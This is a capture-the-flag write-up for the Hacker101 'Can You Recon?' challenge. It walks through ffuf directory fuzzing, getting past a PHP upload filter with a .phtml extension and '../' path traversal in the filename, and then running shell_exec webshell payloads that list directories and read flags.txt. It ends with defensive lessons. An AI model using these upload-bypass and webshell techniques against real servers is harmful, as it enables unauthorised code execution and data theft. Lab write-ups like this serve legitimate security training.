# Y2FuIHlvdSByZWNvbj8/ (Can You Recon?) — Writeup (3/3)

**Difficulty:** Moderate  
**Category:** Web (File Upload Bypass, Path Traversal, RCE)  
**Flags:** 3/3 (complete)  
**Platform:** Hacker101 CTF  
**Base64 name:** Y2FuIHlvdSByZWNvbj8/ = "can you recon?"

---

## Challenge Overview

**Context:** A web application with file upload. The base64 name ("can you recon?") is the hint: the first step is reconnaissance to discover what the server accepts and where files are stored. The extension restriction blocks `.php` but accepts `.phtml`, and the filename field does not validate path traversal.

**What you face:** An upload screen with an extension filter, an upload directory that serves files, and flags stored in `flags.txt` one level above the webroot.

**Vulnerabilities exploited:**
- File Extension Bypass (CWE-434) — `.phtml` is executed as PHP but not filtered
- Path Traversal in Filename (CWE-22) — `../hello.phtml` saves outside the upload directory
- RCE via PHP Upload — `shell_exec()` to list directories and read `flags.txt`

**What you learn:**
- Alternative PHP extensions: `.phtml`, `.php5`, `.phar`, `.shtml` — the list doesn't end at `.php`
- Path traversal in upload filename: the server may accept `../` in the file name
- How to go from limited RCE (shell_exec) to reading a flags file
- Progressive recon strategy: `ls` → `ls ..` → `cat ../flags.txt`
- Never trust extension to determine file type — check magic bytes and block execution in upload directory

---

## Objective

Exploit a PHP file upload disguised as HTML plus path traversal to achieve RCE and read the flags.

---

## Step 1: Reconnaissance via Fuzzing

```bash
ffuf -u https://<INSTANCE>/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Endpoints returning 403:
```
.htaccess
.hta
.htpasswd
admin
server-status
```

The presence of `admin` as 403 indicates a protected area. File upload is available.

---

## Step 2: Identify Extension Restriction

Try uploading `hello.php`:
- Error: "php files are not allowed"

---

## Step 3: Extension Bypass with `.phtml`

`.phtml` is executed as PHP but has an HTML extension. The server allows the upload.

**Upload via form:**
- Filename: `../hello.phtml`
- Content: PHP payload

**The `../` path traversal in the filename** causes the file to be saved one level above the upload directory.

---

## Step 4: Verify PHP Execution

Access: `https://<INSTANCE>/hello.phtml`

File content for testing:
```php
<?php echo "Hello World!"; ?>
```

If "Hello World!" appears → PHP is being executed.

---

## Step 5: Command Execution

Upload:
```php
<?php $out = shell_exec('ls'); echo $out; ?>
```

Accessing `/hello.phtml` returns the directory listing:
```
admin
admin-settings.js
hello.phtml
index.php
```

---

## Step 6: Path Traversal to the Directory Above

Upload:
```php
<?php $out = shell_exec('ls ..'); echo $out; ?>
```

Returns:
```
Autoload.php Flag.php Output.php Route.php View.php controllers data flags.txt index.html models public routes view
```

**`flags.txt` found!**

---

## Step 7: Read All Flags

Upload:
```php
<?php $out = shell_exec('cat ../flags.txt'); echo $out; ?>
```

Returns all 3 flags.

---

## Attack Summary

```
1. ffuf to discover structure + admin area
2. Upload .phtml (alternative PHP extension accepted by server)
3. Path traversal ../hello.phtml in filename → saves in root directory
4. Access to /hello.phtml → PHP execution confirmed
5. shell_exec('ls ..') → flags.txt discovered
6. shell_exec('cat ../flags.txt') → FLAGS 0, 1, 2
```

## Lessons Learned

1. **Alternative PHP extensions** (`.phtml`, `.php5`, `.phar`, `.shtml`) bypass simple extension filters
2. **Path traversal in filename** (`../`) can place files outside the upload directory
3. **Never trust extension** — verify the real MIME type and use `move_uploaded_file()` with a strict whitelist
4. **RCE via webshell upload** is critical — disable PHP execution in upload directories with `.htaccess` or server configuration
5. **flags.txt** in accessible directories is a Hacker101 pattern — always explore the directory tree
